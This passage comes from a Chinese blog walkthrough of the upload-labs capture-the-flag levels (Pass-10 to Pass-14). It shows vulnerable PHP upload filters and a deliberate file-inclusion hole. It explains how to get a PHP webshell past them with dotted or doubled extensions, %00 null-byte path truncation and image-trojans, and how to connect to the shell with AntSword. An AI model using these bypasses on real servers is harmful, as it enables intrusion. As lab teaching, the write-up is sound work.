class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码与前后的关卡中的源码都类似，甚至就是最全面的版本，因此，本关的解法也适用于前面几关。</p></li><li><p>再次统一分析一下这段关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>我们需要知道，文件名末尾的点与空格都是无效的，但是他们却会影响文件的匹配，比如后缀名 <kbd>.php</kbd> 与 <kbd>.php.</kbd> 就不匹配，但是 <kbd>.php.</kbd> 在 Windows 中执行时却因为自动忽略而变成 <kbd>.php</kbd>。因此，为避免空字符突破黑名单的漏洞，程序需要对接收到的文件名做处理，以让黑名单中的后缀名不管怎么伪装总能被匹配到。</p><p>第一句话就是负责删除文件名末尾的点，删除了末尾无效的点之后，文件名中最后一个点后面所接的就是后缀名了，因此：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br></pre></td></tr></table></figure><p>该语句就是获取后缀名，通过 <kbd>strtolower()</kbd> 方法将所有字母小写，这样就屏蔽了大小写漏洞。值得注意的是 <kbd>::&#36;DATA</kbd> ，在 Windows 中会将 <kbd>::&#36;DATA</kbd> 之后的数据当作文件流，而保持 <kbd>::&#36;DATA</kbd> 前的文件名，因此如果文件名为 <kbd>h-t-m.php::&#36;DATAmyr520</kbd> ，就会等价于 <kbd>h-t-m.php</kbd>。因此，第四句话的作用就是将他删去再进行匹配。最后一句话即如注释所示，删去空白字符。因为第一句话只是删除了点，而现在空白字符也删去了。那么，岂不是没有漏洞了？</p></li><li><p>显然不是，上述代码虽然看似完善，但实际上忽略了一个巨大的问题。第一句只能删除末尾的点，而不能删去空白字符，那么如果后缀是这种形式的：<kbd>.php.[].</kbd> （ <kbd>[]</kbd> 表示空白字符），那么第一句话将只能删去最后的那个点，在经过第四句后缀就变成了 <kbd>.php.</kbd>，也就是说还是会剩下一个点。而这就是我们要利用的漏洞，漏洞出现的原因就是没有循环验证。</p></li></ul><h3 id="突破限制-11">突破限制</h3><ul><li><p>需要备好的木马文件的后缀名修改为 <kbd>.php.[].</kbd>（ <kbd>[]</kbd> 表示空格），当然这无法再 Windows 下完成，因此我们需要抓包修改。</p></li><li><p>在 <kbd>BurpSuite</kbd> 中打开靶机并上传木马文件，在文件后缀名之后加上 <kbd>.[].</kbd> （ <kbd>[]</kbd> 表示空格）。</p><img src="https://bu.dusays.com/2022/05/09/6278b05cb6131.webp" alt="" style="zoom:75%"></li><li><kbd>Forward</kbd> 之后文件上传成功！ <img src="https://bu.dusays.com/2022/05/09/6278b00bda517.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-9">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/09/6278b00c92ed0.webp" alt="" style="zoom:75%"><p>如果上传之后直接获取文件 URL 可能后缀名后会带点，由于我们执行文件时点是被系统忽略的，因此蚁剑连接时记得末尾不要带点！</p></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/09/6278b00d7db69.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-11">Pass-11</h2><h3 id="启动靶机-21">启动靶机</h3><ul><li><p>上一关算是一个BOSS，这关总得不太一样吧，专题训练过半🎊</p><img src="https://bu.dusays.com/2022/05/11/627bd7fdc6ff6.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究界面-8">研究界面</h3><ul><li><p>直接查看源码，重点在这句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure><p>这句将文件名中与黑名单匹配的部分换为空，即使黑名单中的文件无法被解析。</p></li><li><p>但是，就这么一句一次只能替换当前存在的黑名单字符，我把后缀名换成 <kbd>.pphphp</kbd> 被替换后还剩下 <kbd>.php</kbd>，这不是正好。甚至可以吧后缀名改成 <kbd>.pphpphpphpphpphpphphp</kbd>，照样正好。</p></li></ul><h3 id="突破限制-12">突破限制</h3><ul><li><p>那就直接将木马文件后缀名改成 <kbd>.pphphp</kbd></p><img src="https://bu.dusays.com/2022/05/11/627bd7ff02968.webp" alt="" style="zoom:75%"></li><li><p>上传，成功！</p><img src="https://bu.dusays.com/2022/05/11/627bd801860ac.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-10">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/11/627bd802bc6c1.webp" alt="" style="zoom:75%"></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/11/627bd804225c5.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-12">Pass-12</h2><h3 id="启动靶机-22">启动靶机</h3><ul><li><p>再次重新开始！</p><img src="https://bu.dusays.com/2022/05/12/627d002f435a7.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究页面-7">研究页面</h3><ul><li><p>先看一下提示：</p><img src="https://bu.dusays.com/2022/05/12/627d003178298.webp" alt="" style="zoom:75%"><p>“上传路径可控”，挺好，就是不太懂怎么个可控法。</p></li><li><p>于是继续查看一下源码，代码不长，因此这里完整梳理一遍：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>可以看出，这次文件过滤不再采用黑名单，而是用白名单将可上传文件限制为 <kbd>.jpg</kbd>、<kbd>.png</kbd>、<kbd>.gif</kbd> 三种格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p>紧接着老长的一句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br></pre></td></tr></table></figure><kbd>strrpos()</kbd> 返回第二个参数（<kbd>.</kbd>）在第一个参数中（文件名）最后一次出现的位置，<kbd>substr()</kbd> 则返回从第二个参数（索引）之后的字符串。 因此，这句语句其实就是截取文件的后缀名。<p>由于是白名单，后缀名截取结果只要不在白名单中均无效，因此，前面关卡中在后缀名后添加无效的点的小伎俩肯定是不能用了。</p></li><li><p>接下来这句其实就是用 <kbd>&#36;temp_file</kbd> 变量引用上传时生成的临时文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br></pre></td></tr></table></figure><p>文件的上传实际上就是将临时文件放入服务器指定位置，也就是后面在 <kbd>if</kbd> 语句中完成的操作，上传成功则返回 <kbd>true</kbd>，否则返回 <kbd>false</kbd>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)</span><br></pre></td></tr></table></figure></li><li><p>而在上述两个语句之间的这句则是本关的重点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><kbd>rand(10, 99)</kbd> 返回一个 <kbd>10</kbd> ~ <kbd>99</kbd> 之间的随机整数，<kbd>date(YmdHis)</kbd> 返回代表当前时间的一串整数，其中 <kbd>YmdHis</kbd> 分别表示年月日时分秒。后面又衔接上了点与后缀名，因此，<kbd>/</kbd> 之后表示以随机数加时间戳的形式重命名文件。上传一个图片测试一下： <img src="https://bu.dusays.com/2022/05/12/627d00323885f.webp" alt="" style="zoom:75%"> <img src="https://bu.dusays.com/2022/05/12/627d003a8f712.webp" alt="" style="zoom:75%"><p>而代码中 <kbd>/</kbd> 之前的 <kbd>&#36;_GET[save_path]</kbd> 则表示指定的上传路径，默认上传路径依然是 <kbd>upload</kbd> 目录下。值得注意的是，<kbd>save_path</kbd> 由 <kbd>GET</kbd> 方式上传，因此，我们可以在 URL 中指定文件的上传路径，而提示中的“上传路径可控”指的自然就是这个了！</p></li></ul><h3 id="突破限制-13">突破限制</h3><ul><li><p>既然可以修改上传路径，那么这对我们又有什么用呢？</p><p>在 URL 中，我们并不能输入所有的字符，而当我们需要表示一个特殊字符时，便需要对他进行编码。在之前的关卡中，我们的木马文件都使用了中文字符作为文件名，但实际使用时却用的是他的编码形式，一般形式为百分号后加二位十六进制数（Ascii）表示一个字符，而一个中文字符需要使用三个一般字符来表示：</p><blockquote><p>http://[靶机地址]/upload/木马.php</p><p>http://[靶机地址]/upload/%E6%9C%A8%E9%A9%AC.php</p></blockquote><p>在浏览器中打开时你会发现显示的依然是中文字符，那是因为浏览器会自动帮助我们解码。</p><p>而在这些编码中，就有一个特殊字符 <kbd>%00</kbd>。在 C 语言的字符串中有一个 Ascii 值为零的特殊字符 <kbd>0</kbd>，一般用于表示字符串结束，而在这里，他也起相同作用。</p></li><li><p>依然注意这段关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><p>当我们上传一个 <kbd>jpg</kbd> 文件，并且指定的路径 <kbd>save_path</kbd> 为 <kbd>../muma.php%00</kbd> ，连之后就会变成 <kbd>../muma.php%00/[随机数].jpg</kbd> . 而这段字符串在 <kbd>%00</kbd> 就已经被截断了，因此原本将文件上传至 <kbd>jpg</kbd> 文件的语句就变成的将文件上传至 <kbd>muma.php</kbd> 文件中，因此，我们就可以入侵了。</p></li><li><p>有趣的是，这个漏洞<strong>只有</strong>在 <kbd>magic_quotes_gpc</kbd> 函数<strong>关闭</strong>的条件下才能实现，而这个函数默认情况下是开启的，且在 <strong>PHP 5.3.4</strong> 版本之后漏洞也已经被修复了。我们在 Pass-05 时获取过 <kbd>phpinfo()</kbd> ，虽然版本号为 5.2.17 是不错，但是很遗憾靶机的 <kbd>magic_quotes_gpc</kbd> 函数依然保持开启状态：</p><img src="https://bu.dusays.com/2022/05/12/627d003cd2d19.webp" alt="" style="zoom:75%"> <img src="https://bu.dusays.com/2022/05/12/627d00b00bbf5.webp" alt="" style="zoom:75%"><p>因此，虽然不太情愿，但本关依旧使用本地搭建的靶机。</p><p>不知道为什么我的 <kbd>PHP study</kbd> 一直无法下载 php 5.2.17 版本，因此我只能在 <a target="_blank" rel="noopener" href="https://www.php.net/releases/index.php">php 发布页</a> 下载了 php 5.2.10 版本（眼瘸，看不到 5.2.17 在哪），并且自行在 <kbd>php.ini</kbd> 配置文件中添加了关闭 <kbd>magic_quotes_gpc</kbd> 函数的配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magic_quotes_gpc = Off</span><br></pre></td></tr></table></figure><blockquote><p>自行下载的 PHP 完整配置请参照 <a href="#Pass-16">Pass-16</a></p></blockquote></li><li><p>准备好木马文件并且以 <kbd>.jpg</kbd> 结尾，暂时伪装成图片文件：</p><img src="https://bu.dusays.com/2022/05/12/627d003b2bc3d.webp" alt="" style="zoom:75%"></li><li><p>打开 <kbd>BurpSuite</kbd> 抓包，我们显然无法在文件上传之前直接在网页上修改路径内容，因此我们对报文进行修改。修改路径变量 <kbd>save_path</kbd> 为 <kbd>../h-t-m.php%00</kbd>：</p><img src="https://bu.dusays.com/2022/05/12/627d003bf1fdf.webp" alt="" style="zoom:75%"></li><li><kbd>Forward</kbd> 之后，上传成功！ <img src="https://bu.dusays.com/2022/05/12/627d00a0aca20.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-11">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/12/627d00a15e6fd.webp" alt="" style="zoom:75%"><p>注意我们依然只需要连接到php木马文件而不是图片文件，毕竟那些都已经被忽略了。</p></li><li><p>本地无旗可夺，看个目录解解馋吧</p><img src="https://bu.dusays.com/2022/05/12/627d00a240e4d.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-13">Pass-13</h2><h3 id="启动靶机-23">启动靶机</h3><ul><li><p>再次回到起点</p><img src="https://bu.dusays.com/2022/05/12/627d00a330629.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究页面-8">研究页面</h3><ul><li><p>本关与上一关几乎一致，唯一不同的地方在于源码中的这一句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><p>将上一关的 <kbd>&#36;&#95;GET[]</kbd> 换成了 <kbd>&#36;&#95;POST[]</kbd> ，代表了网页提交表单的两种方法。</p></li><li><p>关于两种方法的大致区别可以 <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/tags/html_ref_httpmethods.asp">参考这里</a> ，在本关卡中的区别主要是<kbd>GET</kbd> 方法会自动解码，即把 <kbd>%00</kbd> 解码为对应的空字符，而 <kbd>POST</kbd> 方法则不会自动解码，他对百分号没有任何特殊感情。</p></li><li><p>既然不能直接传编码形式的，我们就只能原样传进去了，当然靠输入是肯定没办法输入进去空字符的，因此我们需要修改二进制的报文，直接输入空值！</p></li></ul><h3 id="突破限制-14">突破限制</h3><ul><li><p>打开 <kbd>BurpSuite</kbd> 上传上一关相同的文件（以 <kbd>.jpg</kbd> 后缀作为伪装的 php 木马文件），我们可以在 <kbd>Raw</kbd> 模式下编辑好路径，最后留下一个字符便于我们修改，这里预留一个 <kbd>/</kbd> 字符：</p><img src="https://bu.dusays.com/2022/05/12/627d00a3e831c.webp" alt="" style="zoom:75%"><p>在二进制（<kbd>Hex</kbd>）中找到对应字符，将其修改为 <code>00</code> 即可：</p><img src="https://bu.dusays.com/2022/05/12/627d00a5bad0c.webp" alt="" style="zoom:75%"> <img src="https://bu.dusays.com/2022/05/12/627d00a4bef7b.webp" alt="" style="zoom:75%"><p>当然也可以直接在 <kbd>Raw</kbd> 下输入 <kbd>../h-t-m.php%00</kbd> 并且右键解码即可：</p><img src="https://bu.dusays.com/2022/05/12/627d002e67375.webp" alt="" style="zoom:75%"></li><li><p>然后当然是 <kbd>Forward</kbd> 并且上传成功：</p><img src="https://bu.dusays.com/2022/05/12/627d002d1b56e.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-12">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/12/627d00300ecec.webp" alt="" style="zoom:75%"></li><li><p>依旧无旗可夺~浅看一下目录吧</p><img src="https://bu.dusays.com/2022/05/12/627d0030ba50b.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-14">Pass-14</h2><h3 id="启动靶机-24">启动靶机</h3><ul><li><p>再次<s>回到</s>，哎界面变了：</p><img src="https://bu.dusays.com/2022/05/12/627d002d73bea.webp" alt="" style="zoom:75%"><p>欢迎进入图片马时代！</p></li></ul><h3 id="研究页面-9">研究页面</h3><ul><li><p>先查看提示：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2a2ce14.webp" alt="" style="zoom:75%"><p>对图片的内容开头两个字节进行检查，意味着我们修改修改文件名，改改 <kbd>MIME</kbd> 是肯定不行了，他得是货真价实的图片文件了。</p></li><li><p>至于为什么只用检查文件开头两个字节就能判断文件是否为合法的图片文件，因为那块地方是文件头啊！比如 <kbd>.jpg</kbd> 的文件头字段就是 <kbd>FFD8FF</kbd> ，我们可以在 <kbd>VS code</kbd> 中使用 <kbd>hexdump for VSCode</kbd> 插件查看一张 <kbd>.jpg</kbd> 的图片：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2c9d8a8.webp" alt="" style="zoom:75%"><p>而 <kbd>.png</kbd> 的文件头字段为 <kbd>89504E47</kbd> ，我们用同样的方法打开一个 <kbd>.png</kbd> 的图片即可验证：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2f95b84.webp" alt="" style="zoom:75%"><p>而如果我们将 <kbd>.jpg</kbd> 后缀换成 <kbd>.png</kbd> 后缀再打开文件，会发现：</p><img src="https://bu.dusays.com/2022/05/15/6280fa2d54024.webp" alt="" style="zoom:75%"><p>文件头不会随后缀名的改变而改变，或者更加粗鲁地说，文件的真实类型就取决于文件头。因此，我们能做的，就是将木马内嵌到一个真实且合法的图片文件中，也就是所谓的<strong>图片马</strong>。</p></li><li><p>另外一个重要问题是，藏在图片中的木马如何才能运行起来。</p><p>在进入 Pass-14 时，作者给了三条注意事项，其中第二条就是针对这个问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.使用文件包含漏洞能运行图片马中的恶意代码。</span><br></pre></td></tr></table></figure><p>也就是说，为了运行代码，靶机中预留了文件包含漏洞，同时这也意味着本关漏洞必须配合文件包含漏洞食用。</p></li><li><p>关于这是如何实现的，我们可以先看一下这段文件包含漏洞的代码：</p><blockquote><p>本关就是由于 BUU 上未知原因该代码打不开，所以切换至本地靶机。经测试 BUU 平台文件正常，因此这里挖个坑，日后有能力再来解答。</p><img src="https://bu.dusays.com/2022/05/15/6280fa40dae11.webp" alt="" style="zoom:75%"></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><kbd>header()</kbd> 方法作用就是传送 <kbd>HTML</kbd> 文档标头以告诉浏览器如何处理这个页面，参数内容表示页面内容为 <kbd>html</kbd>，编码为 <kbd>utf-8</kbd>。<p>然后 <kbd>&#36;file</kbd> 通过 <kbd>GET</kbd> 方法接收一个变量 <kbd>file</kbd>，<kbd>isset()</kbd> 则用于判断是否非空。也就是说，如果接收到了数据，数据内容就会被 <kbd>include</kbd> ，而如果没有接收到，则会显示 PHP 中的一个常量 <kbd>&#95;&#95;file&#95;&#95;</kbd> 。</p></li><li><p>而所谓文件包含，就是让服务器执行程序时通过包含函数加载另一个文件中的代码并且执行。有 <kbd>include()</kbd>、<kbd>require()</kbd>、<kbd>include_once()</kbd> 和 <kbd>require_once()</kbd> 四种，其中 <kbd>include()</kbd> 表示执行该语句时包含，而 <kbd>require()</kbd> 表示程序运行开始就包含，后面两种则分别表示前面两种的不重复包含版本，即文件中代码已被包含则不会再次包含。</p></li><li><p>本关中我们上传的图片马中就会包含一句话木马，而木马的激活需要让 PHP 代码被执行，靶机中预留的文件包含漏洞代码中就使用了 <kbd>include</kbd> 函数，因此就可以用文件包含的形式将我们上传的文件内容作为 PHP 代码执行。我们需要做的就是将上传的文件用 <kbd>GET</kbd> 方法传递给该漏洞文件的 <kbd>file</kbd> 变量，我们在前面关卡中也使用过 <kbd>GET</kbd> 方法，只需在 URL 后添加 <kbd>?file=[文件路径]</kbd> 即可传递。</p></li></ul><h3 id="突破限制-15">突破限制</h3><ul><li><p>首先构建图片马，可以采用两种方法，一种是将木马通过文本编辑器（或者命令行）写入图片文件，另一种则是在文本文件输入合法文件头，然后将木马代码直接放在文件头之后。</p></li><li><p>这里先解释第二种方法，为什么文本文件中可以直接存放文件头且合法，文本自身的文件头不起作用吗？</p><ul><li><p>在 Windows 中，我们保存一个文本文件的默认编码都是 <kbd>UTF-8</kbd>，而当我们选择另存为时，会发现还可以选择其他几种编码：</p><p><img src="https://bu.dusays.com/2022/05/15/6280fa4251484.webp" alt="" style="zoom:25%"> <img src="https://bu.dusays.com/2022/05/15/6280fa4306154.webp" alt="" style="zoom:25%"></p><p>这几种编码的具体内容在这不作讨论，只需知道 <kbd>ANSI</kbd> 编码与 <kbd>UTF-8</kbd> 编码是没有文件头的。值得注意的是，<kbd>UTF-8 BOM</kbd> 中的 <kbd>BOM</kbd> 就是 <kbd>UTF-8</kbd> 的文件头的意思，据说之前 Windows 默认就是带文件头版本的 <kbd>UTF-8</kbd> 编码，这里不做考证，如遇到问题修改为 <kbd>ANSI</kbd> 编码即可。</p><p>此外，为明确基本概念，我们还需要知道这里的 <kbd>ANSI</kbd> 编码并不是意味着使用一种叫 <kbd>ANSI</kbd> 的编码，而是根据系统环境为我们选择特定的编码。如图，用记事本打开一张图片，编码就默认为 <kbd>ANSI</kbd>：</p><img src="https://bu.dusays.com/2022/05/15/6280fa43afbe7.webp" alt="" 